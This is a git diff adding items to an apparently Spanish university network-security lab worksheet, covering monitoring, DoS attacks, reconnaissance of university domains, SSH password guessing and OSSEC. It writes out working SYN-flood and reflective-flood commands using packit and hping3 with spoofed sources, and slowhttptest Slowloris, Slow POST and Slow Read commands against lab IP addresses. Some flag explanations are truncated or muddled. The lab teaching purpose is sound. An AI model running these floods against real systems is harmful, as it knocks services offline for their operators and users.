@@ -277,13 +277,133 @@ Si queremos mostrarlo por horas_
 vnstat -h
 ```
 
+***l) Monitorizamos nuestra infraestructura.:***
+
+***• Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux.***
+
+***• Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus.***
+
+***• Importe vía grafana el dashboard 1860.***
+
+***• En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.***
+
+
+***m) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?.***
+
+**Direct attack:** Envío masivo de paquetes de manera directa a la víctima (la dirección origen es normalmente falsificada). Ejemplos: Ping of Dead, TCP SYN Flood….
+
+**Reflective flooding attack:** Se utilizan nodos intermedios como amplificadores (routers,servidores web, DNS …). El atacante envía paquetes que requieren respuesta a losamplificadores con ip origen la ip de la víctima ( los amplificadores responderánmasivamente a la víctima). Ejemplos: SMURF, FRAGGLE…
+
+**Herramientas:**
+- Packit: Inyecta, manipula y monitoriza tráfico ip.
+- Hping3: Añade funcionalidades a ping (spoofing, inyección de paquetes …)
+
+- 
+Direct attack: Inyectar muchos paquetes tcp por el puerto 22 (ssh) con el flag SYN activado,desde una ip aleatoria a la víctima.
+
+```
+packit -c 0 -b 0 -s 10.10.102.Y -d 10.10.102.X -F S -S 1000 -D 22
+```
+
+**-c :** num total de paquetes a enviar (0 indica todos los que pueda).
+
+**-b :** num de paquetes a inyectar cada intervalo de tiempo (especificado por -w y por defecto
+
+```
+hping3 --rand-source -p 80 -S --flood 10.10.102.X
+```
+
+**--rand-source:** direcciones ip aleatorias.
+
+**-S :** flag SYN activo.
+
+**--flood :** envía paquetes todo lo rápido que pueda.
+
+
+**Reflective flooding attack:** Inyectar paquetes ICMP-Echo Request con ip destino todas las redes de la LAN e ip origen la víctima. Todas las máquinas enviarán ICMP-Reply a la víctima.
+
+```
+packit -sR -d 10.10.102.233 -c 0 -b 0 -F S -S 80 -D 22
+```
+**-sR :** ip random.
+
+```
+hping3 --icmp 10.10.102.X --rand-dest --flood 10.10.102.X
+```
+
+**10.10.102.X --rand-dest : X será un número aleatorio 0 - 255.**
 
 
 
+***n) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?***
+
+-H' Starts slowhttptest in SlowLoris mode, sending unfinished HTTP requests.
+
+-B' Starts slowhttptest in Slow POST mode, sending unfinished HTTP message bodies.
+
+-X' Starts slowhttptest in Slow Read mode, reading HTTP responses slowly.
+
+**SLOWHTTPTEST:**
+
+ - c: número de conexiones.
+ - B: modo Slow POST.
+- X: modo Slow Read.
+- i: intervalo entre up data for slowrois and Slow POST tests.
+- s: Valor de Content-Length header para el Slow POST test.
+- x: tamaño máximo de up data en Slow POST.
+- t: Specifies the verb to use in an HTTP request.
+- g: fuerza a generar CSV y HTML
+- o: Especifica nombre -g.
+- r: conexiones por segundo.
+- w: rango de bytes del advertised windows size start Slow Read.
+- y: rango de bytes del advertised windows size end Slow Read.
+- n: intervalo entre operaciones de lectura Slow Read.
+- z: número de bytes a recibir en la operación read() Slow Read.
+- k: número de veces que el recurso es solicitado por socket en Slow Read.
+- u: URL.
+- p: tiempo que espera por respuesta HTTP.
+
+ 
+Herramienta que simula algunos ataques de denegación de servicio en la capa daplicación
+
+**Slow Headers :** Enviar cabeceras incompletas. Queda abierta la conexión.
+
+```
+slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://10.11.48.141/index.html -x 24 -p 3
+```
+
+**Slow Post:** Post con "Content-Length" menor a la cantidad que se envía. Queda abierta conexión esperando.
+
+```
+slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.11.48.141/index.html -x 10 -p 3
+```
+
+**Slow Read :** Peticiones legítimas pero se ralentiza el proceso de lectura de las respuestas.
+
+```
+slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.48.141/index.html -p 3
+```
 
 
+***o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?***
 
+***p) Buscamos información.:***
 
+***• Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.***
+
+***• Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.***
+
+***• ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.***
+
+***• ¿Qué gestor de contenidos se utiliza en www.usc.es?***
+
+***q) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.***
+
+***r) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.***
+
+***s) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.***
+
+***t) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.***
 
 
 
